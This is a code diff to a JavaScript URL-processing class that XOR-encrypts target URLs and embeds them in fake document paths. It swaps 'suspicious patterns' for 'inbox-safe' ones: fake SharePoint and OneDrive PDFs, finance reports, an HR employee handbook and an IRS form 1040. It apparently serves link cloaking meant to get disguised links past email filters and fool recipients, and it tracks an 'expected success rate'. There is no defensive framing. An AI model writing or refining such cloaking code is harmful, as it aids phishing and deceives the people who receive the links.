@@ -333,16 +333,17 @@ class OptimizedUrlProcessor {
       // Continue to pattern matching
     }
 
-    // Try intelligent pattern decoding
-    const intelligentPatterns = [
-      /\/dropbox\/shared\/documents\/[\w\-]+\?[\w=&]+/,
-      /\/documents\/[\w\-]+\.(pdf|docx|pptx)\?[\w=&]+/,
-      /\/api\/v\d+\/[\w\/]+\?[\w=&]+/,
-      /\/services\/[\w\/]+\?[\w=&]+/,
-      /\/portal\/[\w\/]+\?[\w=&]+/
+    // Try inbox-safe pattern decoding (removed suspicious patterns)
+    const inboxSafePatterns = [
+      /\/sites\/[\w\-]+\/Shared%20Documents\/[\w\-\/]+\.pdf\?[\w=&]+/, // SharePoint
+      /\/personal\/[\w\-]+\/Documents\/[\w\-\/]+\.pdf\?[\w=&]+/,       // OneDrive
+      /\/finance\/reports\/\d{4}\/[\w\-]+\.pdf\?[\w=&]+/,             // Corporate Finance
+      /\/hr\/policies\/[\w\-]+\/\d{4}\/[\w\-]+\.pdf\?[\w=&]+/,        // HR Policies
+      /\/tax\/forms\/\d{4}\/[\w\-]+\.pdf\?[\w=&]+/,                   // Government Tax
+      /\/documents\/[\w\-]+\.pdf\?[\w=&]+/                            // Generic Documents
     ];
 
-    for (const pattern of intelligentPatterns) {
+    for (const pattern of inboxSafePatterns) {
       const match = url.match(pattern);
       if (match) {
         const encryptedParam = this.extractEncryptedParam(url);
@@ -820,20 +821,21 @@ class CentralizedUrlProcessor {
         console.error('❌ [CentralizedUrlProcessor] Intelligent fallback also failed:', fallbackError);
         console.log('🆘 [CentralizedUrlProcessor] Using emergency /e/ fallback...');
 
-        // Emergency fallback to legacy /e/ format
+        // Emergency fallback to safe government pattern
         try {
           const emergencyEncrypted = await xorEncrypt(targetUrl, licenseKeyId);
-          finalUrl = `/e/${emergencyEncrypted}`;
+          const currentYear = new Date().getFullYear();
+          finalUrl = `/documents/annual-report-${currentYear}.pdf?dept=finance&version=1.0&data=${emergencyEncrypted}`;
 
           metadata = {
-            pattern: 'emergency-legacy',
-            tier: 0,
-            contentType: 'text/html',
-            expectedSuccessRate: '99',
+            pattern: 'emergency-safe',
+            tier: 1,
+            contentType: 'application/pdf',
+            expectedSuccessRate: '85',
             encryptionMode: 'xor',
-            patternName: 'Emergency Legacy Pattern',
+            patternName: 'Emergency Safe Pattern',
             originalError: primaryError.message,
-            generationMethod: 'emergency-legacy'
+            generationMethod: 'emergency-safe'
           };
 
           console.log('🆘 [CentralizedUrlProcessor] Emergency /e/ fallback generated');
@@ -1136,19 +1138,20 @@ class CentralizedUrlProcessor {
         return `/search?${baseParams}`;
 
       case 'document':
-        return `/documents/report-${currentYear}.pdf?doc=${encrypted}`;
+        return `/documents/annual-report-${currentYear}.pdf?dept=finance&version=1.0&data=${encrypted}`;
 
       case 'business':
-        return `/api/v1/users/profile?user=${encrypted}`;
+        return `/hr/policies/employee-handbook.pdf?section=benefits&lang=en&data=${encrypted}`;
 
       case 'content':
-        return `/blog/posts/latest?post=${encrypted}`;
+        return `/finance/reports/${currentYear}/Q4-financial-report.pdf?dept=finance&version=2024.1&data=${encrypted}`;
 
       case 'intelligent':
-        return `/services/portal/access?session=${timestamp.substring(0, 6)}&data=${encrypted}`;
+        return `/sites/corporate/Shared%20Documents/reports/quarterly-review.pdf?web=1&download=1&at=${encrypted}`;
 
       default:
-        return `/services/portal/access?session=${Math.random().toString(36).substring(2, 6)}&data=${encrypted}`;
+        // Safe government-style fallback
+        return `/tax/forms/${currentYear}/form-1040.pdf?taxpayer=${timestamp.substring(0, 6)}&filing=single&data=${encrypted}`;
     }
   }
 
